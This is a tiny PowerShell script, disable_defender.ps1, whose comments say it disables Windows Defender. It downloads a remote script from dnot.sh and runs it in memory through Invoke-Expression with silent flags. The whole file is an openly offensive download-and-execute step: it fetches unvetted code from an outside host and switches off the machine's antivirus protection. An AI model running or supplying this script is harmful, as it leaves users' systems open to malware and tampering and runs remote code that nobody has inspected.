# disable_defender.ps1 – Downloads and runs defendnot one‑liner (in memory)
$url = "https://dnot.sh/"
$script = (New-Object Net.WebClient).DownloadString($url)
# Run with --silent --disable-autorun to avoid persistence and console
Invoke-Expression $script --silent --disable-autorun
